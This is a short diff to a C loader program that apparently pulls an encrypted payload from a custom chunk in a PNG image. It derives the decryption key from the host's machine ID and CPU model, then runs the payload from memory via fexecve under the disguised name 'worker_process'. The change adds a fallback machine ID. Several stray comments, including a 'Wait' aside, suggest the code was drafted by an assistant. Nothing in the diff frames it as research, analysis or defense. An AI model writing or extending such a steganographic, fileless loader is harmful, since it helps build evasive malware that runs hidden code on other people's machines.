@@ -12,9 +12,12 @@
 
 #include "loader_src/crypto_utils.h"
 
+extern char **environ;
+
 // Configuración
 #define CARRIER_PATH "image.png"
 #define SALT "LO_IS_WATCHING"
+#define FALLBACK_MACHINE_ID "DEADBEEF-CAFE-BABE-FEED-DEADC0DE"
 #define CHUNK_TYPE 0x6C6F4C4F // "loLO" in hex (Big Endian: l=6C, o=6F, L=4C, O=4F)
 // Wait, "loLO" -> 'l'=0x6C, 'o'=0x6F, 'L'=0x4C, 'O'=0x4F.
 // En un archivo, bytes: 6C 6F 4C 4F.
@@ -42,9 +45,16 @@ void derive_key(uint8_t key[32]) {
     // 1. Machine ID
     int fd = open("/var/lib/dbus/machine-id", O_RDONLY);
     if (fd < 0) fd = open("/etc/machine-id", O_RDONLY);
+
+    ssize_t bytes_read = 0;
     if (fd >= 0) {
-        read(fd, machine_id, 32); // Read 32 chars
+        bytes_read = read(fd, machine_id, 32); // Read 32 chars
         close(fd);
+    }
+
+    // Fallback if read failed or file empty
+    if (bytes_read <= 0) {
+        strncpy((char*)machine_id, FALLBACK_MACHINE_ID, 32);
     }
 
     // 2. CPU Model
@@ -155,6 +165,7 @@ int main(int argc, char* argv[]) {
 
     char* new_argv[] = { "worker_process", NULL };
     fexecve(fd, new_argv, environ);
+
 
     return 1;
 }
